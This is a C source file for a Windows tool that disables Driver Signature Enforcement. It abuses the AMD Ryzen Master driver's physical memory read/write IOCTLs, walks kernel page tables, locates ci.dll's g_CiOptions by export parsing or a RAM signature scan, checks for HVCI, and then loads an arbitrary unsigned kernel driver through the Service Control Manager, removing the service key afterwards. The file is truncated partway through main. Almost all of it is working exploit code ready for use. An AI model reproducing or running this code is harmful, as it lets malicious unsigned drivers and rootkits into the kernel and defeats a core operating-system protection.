/*
 * dse_patch.c — Driver Signature Enforcement disable via g_CiOptions
 *
 * How it works:
 *   ci.dll exports nothing useful, but contains a global DWORD g_CiOptions
 *   in its .data/.rdata section that controls DSE:
 *     0x0 = signing disabled (all drivers allowed)
 *     0x6 = signing enabled  (default)
 *     0x8 = WHQL-only mode
 *
 *   This is a DATA-ONLY patch: write 0 to g_CiOptions → any unsigned
 *   driver loads via sc.exe. No code modification → PatchGuard safe.
 *
 * Finding g_CiOptions without symbols:
 *   Method A — Export scan: ci.dll exports CipInitialize, which internally
 *     references g_CiOptions. Parse the function prologue to find the MOV
 *     instruction that loads the address.
 *   Method B — Section scan: g_CiOptions is in a writable data section.
 *     Scan ci.dll .data section for DWORD == 0x6 near the start of section.
 *     Validate by checking neighbors (nearby bytes look like CI flags).
 *   Method C — Brute force: scan entire ci.dll data region for DWORD == 0x6
 *     where surrounding bytes match the expected CI_OPTIONS struct pattern.
 *
 * Limitation: Requires NO VBS/HVCI. If HVCI is on, KDP protects the page
 * and a plain phys_write is silently ignored. This tool detects HVCI and
 * warns. A page-swap technique is needed for HVCI (not implemented here).
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -Wno-unused-function \
 *       -o dse_patch.exe dse_patch.c -lkernel32 -ladvapi32
 *
 * Usage:
 *   dse_patch.exe driver.sys          -- patch DSE, load driver, restore DSE
 *   dse_patch.exe --check             -- check g_CiOptions value, don't patch
 *   dse_patch.exe --permanent drv.sys -- load driver, DON'T restore DSE (debug)
 *
 * driver.sys may be relative or absolute path.
 * The service name is derived from the filename (without .sys extension).
 * After successful load, the service registry key is deleted but the driver
 * stays in memory until unloaded or reboot.
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>

/* ── AMD Ryzen Master driver primitives ─────────────────────────────── */
#define AMD_DEVICE   "\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_READ   0x81112F08u
#define IOCTL_WRITE  0x81112F0Cu

static HANDLE g_dev = INVALID_HANDLE_VALUE;

#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY h;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0, KEY_READ, &h) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type; uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0;;i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(h,i,vname,&vn,NULL,&type,NULL,&vd)==ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(h,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS) { sz=vd; break; }
        free(buf); buf=NULL;
    }
    RegCloseKey(h);
    if (!buf||sz<20) { free(buf); return; }
    DWORD cnt = *(DWORD*)(buf+16); uint8_t *p = buf+20;
    for (DWORD i = 0; i<cnt&&g_nranges<MAX_RANGES; i++,p+=20) {
        if (p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base = *(uint64_t*)(p+4);
        g_ranges[g_nranges].size = *(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for (int i=0;i<g_nranges;i++)
        if (pa>=g_ranges[i].base && pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

#define IOBUF (4096+12)
static uint8_t g_iobuf[IOBUF];

static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    uint8_t in[12]; *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    uint32_t osz = 12 + sz;
    /* AMD driver needs nOutBufferSize >= IOBUF even for small requests */
    uint32_t dev_osz = osz < IOBUF ? IOBUF : osz;
    uint8_t *out; void *dyn = NULL;
    if(dev_osz <= IOBUF) out = g_iobuf;
    else { dyn = malloc(dev_osz); if(!dyn) return 0; out = (uint8_t*)dyn; }
    DWORD got = 0;
    BOOL ok = DeviceIoControl(g_dev, IOCTL_READ, in, 12, out, dev_osz, &got, NULL);
    if(ok && (uint32_t)got >= 12 + sz) memcpy(buf, out+12, sz);
    else ok = 0;
    free(dyn); return ok;
}

/* Read sz bytes using a 256-KB chunk read.
 * The AMD driver's small-read path (page or 4-byte) fails for kernel module
 * pages at high PA on Win11, while the same 256-KB path used by the
 * signature scan succeeds.  Use this for all g_CiOptions read/verify calls. */
static int phys_read_chunk(uint64_t pa, void *buf, uint32_t sz)
{
    static uint8_t tmp[0x40000];
    const uint32_t CHUNK = sizeof tmp;
    uint64_t base = pa & ~(uint64_t)(CHUNK - 1);
    uint32_t off  = (uint32_t)(pa - base);
    if((uint64_t)off + sz > CHUNK) return 0;
    if(!phys_read(base, tmp, CHUNK)){
        /* chunk read failed — try page-by-page fallback */
        memset(tmp, 0, CHUNK);
        int any = 0;
        for(uint32_t pg = 0; pg < CHUNK; pg += 0x1000){
            if(phys_read(base + pg, tmp + pg, 0x1000)) any = 1;
        }
        if(!any) return 0;
    }
    memcpy(buf, tmp + off, sz);
    return 1;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) { printf("  [!] PA 0x%016"PRIX64" not in range\n",pa); return 0; }
    uint32_t isz=12+sz; uint8_t *in=(uint8_t*)malloc(isz); if(!in) return 0;
    *(uint64_t*)in=pa; *(uint32_t*)(in+8)=sz;
    memcpy(in+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_WRITE,in,isz,NULL,0,&got,NULL);
    free(in); return ok;
}

/* ── Kernel CR3 + VA→PA ─────────────────────────────────────────────── */
static uint64_t g_cr3 = 0;

static uint64_t cr3_walk(uint64_t cr3, uint64_t va)
{
    uint64_t i4=(va>>39)&0x1FF,i3=(va>>30)&0x1FF,i2=(va>>21)&0x1FF,i1=(va>>12)&0x1FF;
    uint64_t e=0;
    if(!phys_read(cr3+i4*8,&e,8)||!(e&1)) return 0;
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+i3*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+i2*8,&e,8)||!(e&1)) return 0;
    if(e&(1ULL<<7)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
    if(!phys_read((e&0x000FFFFFFFFFF000ULL)+i1*8,&e,8)||!(e&1)) return 0;
    return (e&0x000FFFFFFFFFF000ULL)|(va&0xFFF);
}

static uint64_t kva_to_pa(uint64_t va)
{ return g_cr3 ? cr3_walk(g_cr3,va) : 0; }

static uint64_t find_kernel_cr3(uint64_t ntos_va)
{
    uint32_t pml4i = ntos_va ? (uint32_t)((ntos_va>>39)&0x1FF) : 0;
    static uint8_t pg[4096];
    /* Pass 1: classic self-ref at 0x1ED */
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x10000000ULL) continue;
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x10000000ULL) re=0x10000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            uint64_t e=0;
            if(!phys_read(pa+0x1ED*8,&e,8)) continue;
            if(!((e&1)&&(e&0x000FFFFFFFFFF000ULL)==pa)) continue;
            if(pml4i){uint64_t ke=0;if(!phys_read(pa+pml4i*8,&ke,8)||!(ke&1))continue;}
            return pa;
        }
    }
    /* Pass 2: randomised self-ref slot 0x100–0x1FF (Win10 1703+) */
    for(int ri=0;ri<g_nranges;ri++){
        if(g_ranges[ri].base>=0x4000000ULL) continue;
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        if(re>0x4000000ULL) re=0x4000000ULL;
        for(uint64_t pa=g_ranges[ri].base;pa<re;pa+=0x1000){
            if(!phys_read(pa,pg,4096)) continue;
            for(int idx=0x100;idx<0x200;idx++){
                uint64_t e=*(uint64_t*)(pg+idx*8);
                if(!(e&1)||(e&0x000FFFFFFFFFF000ULL)!=pa) continue;
                if(pml4i){uint64_t ke=*(uint64_t*)(pg+pml4i*8);if(!(ke&1))continue;}
                return pa;
            }
        }
    }
    if(ntos_va) return find_kernel_cr3(0);
    return 0;
}

/* ── NtQuerySystemInformation helper ───────────────────────────────── */
typedef NTSTATUS(NTAPI*PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
static PFN_NTQSI g_ntqsi = NULL;

typedef struct {
    HANDLE Section; PVOID MappedBase, ImageBase;
    ULONG  ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    if(!g_ntqsi) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=g_ntqsi(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;}
    return ml;
}

/* ── HVCI/VBS detection ─────────────────────────────────────────────── */
static int is_hvci_enabled(void)
{
    /* Check registry: DeviceGuard config */
    HKEY h;
    DWORD val=0, sz=4;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
        0,KEY_READ,&h)==ERROR_SUCCESS){
        RegQueryValueExA(h,"EnableVirtualizationBasedSecurity",NULL,NULL,(BYTE*)&val,&sz);
        RegCloseKey(h);
        if(val) return 1;
    }
    /* Also check HypervisorEnforcedCodeIntegrity */
    val=0; sz=4;
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        0,KEY_READ,&h)==ERROR_SUCCESS){
        RegQueryValueExA(h,"Enabled",NULL,NULL,(BYTE*)&val,&sz);
        RegCloseKey(h);
        if(val) return 1;
    }
    return 0;
}

/* ── PE helpers ─────────────────────────────────────────────────────── */
/* Map ci.dll from disk into memory for analysis */
static uint8_t *read_file(const char *path, DWORD *out_sz)
{
    HANDLE fh=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(fh==INVALID_HANDLE_VALUE) return NULL;
    DWORD sz=GetFileSize(fh,NULL);
    if(sz==0||sz==INVALID_FILE_SIZE){CloseHandle(fh);return NULL;}
    uint8_t *buf=(uint8_t*)malloc(sz);
    if(!buf){CloseHandle(fh);return NULL;}
    DWORD rd=0; ReadFile(fh,buf,sz,&rd,NULL); CloseHandle(fh);
    if(rd!=sz){free(buf);return NULL;}
    if(out_sz) *out_sz=sz;
    return buf;
}

/* Get section info from PE: name → VA, raw offset, raw size */
typedef struct { uint32_t va; uint32_t raw_off; uint32_t raw_sz; uint32_t virt_sz; } SecInfo;

static int pe_get_section(const uint8_t *pe, DWORD fsz, const char *name, SecInfo *out)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x18>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6);
    uint16_t osz=*(uint16_t*)(pe+elf+20);
    uint32_t sec_off=(uint32_t)elf+24+osz;
    for(uint16_t i=0;i<ns;i++){
        uint32_t s=sec_off+i*40;
        if(s+40>fsz) break;
        char sname[9]={0}; memcpy(sname,pe+s,8);
        if(strcmp(sname,name)==0){
            out->va      = *(uint32_t*)(pe+s+12);
            out->virt_sz = *(uint32_t*)(pe+s+8);
            out->raw_off = *(uint32_t*)(pe+s+20);
            out->raw_sz  = *(uint32_t*)(pe+s+16);
            return 1;
        }
    }
    return 0;
}

/* Get export VA by name */
static uint32_t pe_export_rva(const uint8_t *pe, DWORD fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6); uint16_t osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    #define R2F(rva,fo) do{(fo)=0;\
      for(uint16_t _i=0;_i<ns;_i++){\
        uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
        uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
        uint32_t _fo=*(uint32_t*)(pe+_s+20);\
        if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}}while(0)
    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* ── g_CiOptions discovery ──────────────────────────────────────────── */

/*
 * Method A: Parse CipInitialize to find g_CiOptions address.
 *
 * CipInitialize is the entrypoint of ci.dll. On Win10/11, it contains
 * a MOV [rip+offset], imm32 or MOV reg, [rip+offset] pattern that
 * references g_CiOptions shortly after the start of the function.
 *
 * We disassemble (manually decode) the first 0x200 bytes looking for:
 *   48 8B 05 xx xx xx xx   MOV RAX, [RIP+xxxx]   (load from g_CiOptions region)
 *   OR 89 0D xx xx xx xx   MOV [RIP+xxxx], ECX   (store to g_CiOptions)
 *   OR C7 05 xx xx xx xx   MOV DWORD PTR [RIP+xxxx], imm32
 *
 * The target value near the instruction should be 0 (at boot) or 0x6.
 * We validate by checking that 3 nearby DWORDs are all plausible CI flag values (<0x100).
 */
static uint64_t find_cioptions_via_export(const uint8_t *ci_disk, DWORD disk_sz,
                                            uint64_t ci_base_va)
{
    uint32_t init_rva = pe_export_rva(ci_disk, disk_sz, "CipInitialize");
    if(!init_rva){
        /* Try alternate export names */
        init_rva = pe_export_rva(ci_disk, disk_sz, "CiInitialize");
    }
    if(!init_rva){
        printf("  [Method A] CipInitialize/CiInitialize export not found\n");
        return 0;
    }
    printf("  [Method A] CipInitialize RVA=0x%X  VA=0x%"PRIX64"\n",
           init_rva, ci_base_va+init_rva);

    /* Scan first 0x300 bytes of CipInitialize for RIP-relative accesses */
    uint32_t fo=0;
    /* Convert RVA to file offset */
    int32_t elf=*(int32_t*)(ci_disk+0x3C);
    uint16_t ns=*(uint16_t*)(ci_disk+elf+6), osz=*(uint16_t*)(ci_disk+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;
    for(uint16_t i=0;i<ns&&!fo;i++){
        uint32_t s=sb+i*40;
        uint32_t sec_va=*(uint32_t*)(ci_disk+s+12);
        uint32_t sec_vsz=*(uint32_t*)(ci_disk+s+16);
        uint32_t sec_raw=*(uint32_t*)(ci_disk+s+20);
        if(init_rva>=sec_va&&init_rva<sec_va+sec_vsz)
            fo=sec_raw+(init_rva-sec_va);
    }
    if(!fo||fo+0x300>disk_sz){
        printf("  [Method A] Cannot locate CipInitialize in file\n");
        return 0;
    }

    const uint8_t *fn=ci_disk+fo;
    uint64_t fn_va=ci_base_va+init_rva;

    for(uint32_t off=0; off+7<=0x300; off++){
        const uint8_t *p=fn+off;
        int32_t rel=0;
        uint64_t target_va=0;

        /* MOV [RIP+rel32], r/m  — opcode variants that write to g_CiOptions */
        /* 89 0D rel32 — MOV [RIP+rel32], ECX */
        if(p[0]==0x89 && p[1]==0x0D){ memcpy(&rel,p+2,4); target_va=fn_va+off+6+rel; }
        /* 89 15 rel32 — MOV [RIP+rel32], EDX */
        else if(p[0]==0x89 && p[1]==0x15){ memcpy(&rel,p+2,4); target_va=fn_va+off+6+rel; }
        /* C7 05 rel32 imm32 — MOV DWORD PTR [RIP+rel32], imm32 */
        else if(p[0]==0xC7 && p[1]==0x05){ memcpy(&rel,p+2,4); target_va=fn_va+off+10+rel; }
        /* 8B 0D rel32 — MOV ECX, [RIP+rel32] (load g_CiOptions) */
        else if(p[0]==0x8B && p[1]==0x0D){ memcpy(&rel,p+2,4); target_va=fn_va+off+6+rel; }
        /* 8B 05 rel32 — MOV EAX, [RIP+rel32] */
        else if(p[0]==0x8B && p[1]==0x05){ memcpy(&rel,p+2,4); target_va=fn_va+off+6+rel; }

        if(!target_va) continue;

        /* Validate: target_va must be within ci.dll .data range */
        /* Rough check: within 4MB of ci_base (ci.dll is small) */
        if(target_va < ci_base_va || target_va > ci_base_va+0x400000) continue;

        /* Read current value via physical memory */
        uint64_t pa = kva_to_pa(target_va);
        if(!pa) continue;
        uint32_t val=0;
        if(!phys_read(pa,&val,4)) continue;

        /* g_CiOptions should be 0x0, 0x6, or 0x8 — nothing else */
        if(val!=0x0 && val!=0x6 && val!=0x8) continue;

        /* Double-check: neighbours should also look like CI flag fields (small values) */
        uint32_t prev4=0, next4=0;
        phys_read(pa-4,&prev4,4);
        phys_read(pa+4,&next4,4);
        /* Sanity: CI struct neighbours are usually 0 or small flags, not huge pointers */
        if(prev4>0x10000 || next4>0x10000) continue;

        printf("  [Method A] Found g_CiOptions VA=0x%016"PRIX64"  PA=0x%016"PRIX64
               "  value=0x%X\n", target_va, pa, val);
        return pa;
    }
    printf("  [Method A] No g_CiOptions candidate found in CipInitialize\n");
    return 0;
}

/*
 * Method B: Physical signature scan (works on Hyper-V / SLAT).
 *
 * Problem with VA→PA: on Hyper-V, SLAT blocks page table reads → kva_to_pa()
 * returns 0 for kernel module pages → direct VA scan fails.
 *
 * Solution: Read ci.dll from DISK, find candidate DWORDs == 0x6 in the .data
 * section, build a 32-byte unique signature from surrounding bytes, then scan
 * ALL physical RAM for that exact byte sequence.
 *
 * Why this works:
 *   - ci.dll .data section is loaded as-is from disk (pre-initialised data,
 *     no relocations in that region).
 *   - The 32-byte window around g_CiOptions is unique in physical memory
 *     (bytes from the CI configuration struct don't repeat elsewhere in RAM).
 *   - Physical data pages of ci.dll ARE readable — only page TABLE pages are
 *     SLAT-protected.
 *
 * Scan is stride-4 (g_CiOptions is DWORD-aligned).
 * Signature length 32 bytes gives ~0% false-positive probability.
 */
static uint64_t phys_scan_for_signature(const uint8_t *sig, uint32_t sig_len,
                                          uint32_t cioptions_off_in_sig)
{
    static uint8_t chunk[0x40000]; /* 256KB */
    static uint8_t page_buf[0x1000];
    const uint32_t CHUNK = sizeof chunk;
    const uint8_t fc = sig[0];

    printf("  [Method B] Scanning RAM for ci.dll signature (%u bytes)...\n", sig_len);

    for(int ri=0; ri<g_nranges; ri++){
        uint64_t rbase=g_ranges[ri].base, rend=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=rbase; cpa<rend; cpa+=CHUNK){
            uint64_t csz=rend-cpa; if(csz>CHUNK) csz=CHUNK;
            if(!phys_read(cpa,chunk,(uint32_t)csz)){
                memset(chunk,0,(size_t)csz); int any=0;
                for(uint64_t pg=0;pg<csz;pg+=0x1000){
                    uint32_t psz=csz-pg<0x1000?(uint32_t)(csz-pg):0x1000;
                    if(phys_read(cpa+pg,page_buf,psz)){memcpy(chunk+pg,page_buf,psz);any=1;}
                }
                if(!any) continue;
            }
            /* Stride-4: g_CiOptions is DWORD-aligned */
            for(uint64_t off=0; off+sig_len<=csz; off+=4){
                if(chunk[off]!=fc) continue;
                if(memcmp(chunk+off, sig, sig_len)!=0) continue;
                uint64_t match_pa = cpa+off;
                printf("  [Method B] Signature match at PA=0x%016"PRIX64"\n", match_pa);
                return match_pa + cioptions_off_in_sig;
            }
        }
    }
    return 0;
}

static uint64_t find_cioptions_via_phys_scan(const uint8_t *ci_disk, DWORD disk_sz)
{
    printf("  [Method B] Building signature from ci.dll disk image...\n");

    /* Find ALL sections that could contain g_CiOptions (.data, .rdata, CiDp) */
    static const char *data_sections[] = { ".data", ".rdata", "CiDp", NULL };

    for(int si=0; data_sections[si]; si++){
        SecInfo sec; memset(&sec,0,sizeof sec);
        if(!pe_get_section(ci_disk,disk_sz,data_sections[si],&sec)) continue;
        if(!sec.raw_off || !sec.raw_sz) continue;

        printf("  [Method B] Scanning section '%s' (raw_off=0x%X sz=0x%X)\n",
               data_sections[si], sec.raw_off, sec.raw_sz);

        const uint8_t *sdata = ci_disk + sec.raw_off;
        uint32_t slen = sec.raw_sz < disk_sz-sec.raw_off ? sec.raw_sz : disk_sz-sec.raw_off;

        /* Scan for DWORD == 0x6 with small-value neighbours */
        for(uint32_t off=4; off+8<=slen; off+=4){
            uint32_t val; memcpy(&val, sdata+off, 4);
            if(val!=0x6) continue;

            uint32_t p4=0, n4=0;
            memcpy(&p4, sdata+off-4, 4);
            memcpy(&n4, sdata+off+4, 4);
            /* CI_OPTIONS neighbours are small flags or zero */
            if(p4>0x100 || n4>0x100) continue;

            /* Build 32-byte signature: 16 bytes before + 16 bytes after candidate.
             * Require 16 bytes before and 16 bytes after to be available. */
            if(off<16 || off+20>slen) continue;
            const uint8_t *sig = sdata + off - 16;
            uint32_t sig_len = 32;

            /* Check signature is non-trivial (not all zeros) */
            int nonzero=0;
            for(uint32_t k=0;k<sig_len;k++) if(sig[k]) { nonzero=1; break; }
            if(!nonzero) continue;

            printf("  [Method B] Candidate at disk off=0x%X  val=0x%X  p4=0x%X  n4=0x%X\n",
                   sec.raw_off+off, val, p4, n4);
            printf("             Signature (hex): ");
            for(int k=0;k<16;k++) printf("%02X ",sig[k]);
            printf("[06 00 00 00] ");
            for(int k=20;k<32;k++) printf("%02X ",sig[k]);
            printf("\n");

            /* Physical RAM scan for this signature */
            uint64_t pa = phys_scan_for_signature(sig, sig_len, 16);
            if(pa){
                printf("  [Method B] g_CiOptions PA=0x%016"PRIX64"\n", pa);
                return pa;
            }
            printf("  [Method B] No match for this candidate, trying next...\n");
        }
    }
    printf("  [Method B] No g_CiOptions found\n");
    return 0;
}

/* ── Driver load / unload via SCM ───────────────────────────────────── */

/*
 * Extract service name from a driver path.
 * "C:\path\to\mydriver.sys" → "mydriver"
 * Must be ≤256 chars, alphanumeric/underscore only (SCM requirement).
 */
static void path_to_svcname(const char *path, char *out, size_t outsz)
{
    const char *base = strrchr(path, '\\');
    base = base ? base+1 : path;
    strncpy(out, base, outsz-1); /* truncation is intentional — SCM name limit */
    out[outsz-1] = '\0';
    /* Strip .sys extension (case-insensitive) */
    size_t len = strlen(out);
    if(len>4 && _stricmp(out+len-4,".sys")==0)
        out[len-4] = '\0';
    /* Replace non-alphanumeric with '_' */
    for(char *p=out; *p; p++)
        if(!isalnum((unsigned char)*p)) *p='_';
}

/*
 * load_driver — register + start a kernel driver via SCM.
 *
 * Returns 0 on success, 1 on failure.
 * Always tries to delete the service key on exit (cleanup), even on failure.
 * The driver image stays mapped in kernel memory after service deletion.
 *
 * binPath MUST be an absolute path — SCM rejects relative paths.
 */
static int load_driver(const char *abs_path, const char *svc_name)
{
    int rc = 1;
    SC_HANDLE scm = NULL, svc = NULL;

    scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if(!scm){
        printf("  [!] OpenSCManager failed: %lu\n", GetLastError());
        printf("      (Need admin rights)\n");
        return 1;
    }

    /* Delete stale service entry if it exists from a previous run */
    svc = OpenServiceA(scm, svc_name, SERVICE_ALL_ACCESS);
    if(svc){
        printf("  [*] Stale service '%s' found — removing...\n", svc_name);
        /* Stop it first (ignore error if not running) */
        SERVICE_STATUS ss; ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(svc);
        CloseServiceHandle(svc); svc=NULL;
        Sleep(200); /* give SCM time to process deletion */
    }

    /* Create service entry */
    svc = CreateServiceA(
        scm, svc_name, svc_name,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        abs_path,
        NULL, NULL, NULL, NULL, NULL);

    if(!svc){
        DWORD err = GetLastError();
        printf("  [!] CreateService failed: %lu\n", err);
        if(err == ERROR_SERVICE_EXISTS){
            /* Shouldn't happen after delete above, but handle anyway */
            svc = OpenServiceA(scm, svc_name, SERVICE_ALL_ACCESS);
        }
        if(!svc) goto cleanup;
    }
    printf("  [+] Service '%s' created\n", svc_name);

    /* Start (load) the driver */
    printf("  [*] Starting driver...\n");
    if(!StartServiceA(svc, 0, NULL)){
        DWORD err = GetLastError();
        if(err == ERROR_SERVICE_ALREADY_RUNNING){
            printf("  [+] Driver already running\n");
            rc = 0;
        } else {
            printf("  [!] StartService failed: %lu\n", err);
            /* Common errors:
             *   577  = ERROR_INVALID_IMAGE_HASH (still signed, DSE still on — verify patch)
             *   1275 = ERROR_DRIVER_BLOCKED_CRITICAL (WDAC block list)
             *   2    = ERROR_FILE_NOT_FOUND (wrong path)
             *   5    = ERROR_ACCESS_DENIED (integrity level)
             */
            if(err==577)
                printf("  [!] Error 577: signature check STILL failing — "
                       "g_CiOptions may not be at correct PA\n");
            if(err==1275)
                printf("  [!] Error 1275: driver is on WDAC block list — "
                       "cannot load even with DSE disabled\n");
            rc = 1;
        }
    } else {
        printf("  [+] Driver loaded successfully\n");
        rc = 0;
    }

cleanup:
    if(svc){
        /* Remove service registry entry — driver stays loaded in memory */
        if(!DeleteService(svc))
            printf("  [!] DeleteService failed: %lu (non-fatal)\n", GetLastError());
        else
            printf("  [+] Service registry entry removed (driver stays in memory)\n");
        CloseServiceHandle(svc);
    }
    CloseServiceHandle(scm);
    return rc;
}

/* ── Main logic ─────────────────────────────────────────────────────── */
int main(int argc, char *argv[])
{
    int check_only = 0, permanent = 0;
    const char *drv_path = NULL;

    for(int i=1;i<argc;i++){
        if(!strcmp(argv[i],"--check"))      { check_only=1; continue; }
        if(!strcmp(argv[i],"--permanent"))  { permanent=1;  continue; }
        /* Anything else is treated as the driver path */
        drv_path = argv[i];
    }

    printf("+------------------------------------------+\n");
    printf("|  DSE Patch — g_CiOptions via AMD R/W    |\n");
    printf("+------------------------------------------+\n\n");

    /* Validate driver path if provided */
    char abs_drv_path[MAX_PATH] = {0};
    char svc_name[64] = {0};

    if(!check_only){
        if(!drv_path){
            printf("Usage: dse_patch.exe [--check] [--permanent] <driver.sys>\n\n");
            printf("  --check      : show current g_CiOptions value, do not patch\n");
            printf("  --permanent  : do not restore g_CiOptions after loading\n");
            printf("  driver.sys   : path to unsigned kernel driver to load\n\n");
            printf("Examples:\n");
            printf("  dse_patch.exe mydriver.sys\n");
            printf("  dse_patch.exe C:\\tools\\mydriver.sys\n");
            printf("  dse_patch.exe --check\n");
            return 1;
        }

        /* Resolve to absolute path — SCM requires absolute paths */
        if(!GetFullPathNameA(drv_path, MAX_PATH, abs_drv_path, NULL)){
            printf("[!] Cannot resolve path '%s': %lu\n", drv_path, GetLastError());
            return 1;
        }

        /* Verify file exists before we do anything to the system */
        if(GetFileAttributesA(abs_drv_path)==INVALID_FILE_ATTRIBUTES){
            printf("[!] Driver not found: %s\n", abs_drv_path);
            return 1;
        }

        path_to_svcname(abs_drv_path, svc_name, sizeof svc_name);
        printf("[+] Driver path : %s\n", abs_drv_path);
        printf("[+] Service name: %s\n\n", svc_name);
    }

    /* ── 1. HVCI check ── */
    printf("[*] Checking HVCI/VBS status...\n");
    if(is_hvci_enabled()){
        printf("[!] HVCI/VBS appears to be ENABLED (registry).\n");
        printf("    Plain phys_write to g_CiOptions will be silently ignored.\n");
        printf("    A page-swap technique is required. This tool does NOT implement that.\n");
        printf("    Aborting.\n");
        return 1;
    }
    printf("[+] HVCI/VBS: OFF (registry) — plain patch should work\n\n");

    /* ── 2. Open AMD driver ── */
    g_dev = CreateFileA(AMD_DEVICE, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        printf("[!] Cannot open AMD driver: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] AMD driver opened\n");

    load_ranges();
    printf("[+] Physical ranges: %d\n", g_nranges);

    g_ntqsi=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                       "NtQuerySystemInformation");

    /* ── 3. Find ntoskrnl VA for CR3 validation ── */
    uint64_t ntos_va = 0;
    MOD_LIST *ml = get_module_list();
    if(ml){
        for(ULONG i=0;i<ml->NumberOfModules;i++){
            const char *fn2=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
            if(_stricmp(fn2,"ntoskrnl.exe")==0||_stricmp(fn2,"ntkrnlmp.exe")==0){
                ntos_va=(uint64_t)ml->Modules[i].ImageBase; break;
            }
        }
    }
    if(ntos_va) printf("[+] ntoskrnl VA = 0x%016"PRIX64"\n", ntos_va);

    /* ── 4. Find kernel CR3 ── */
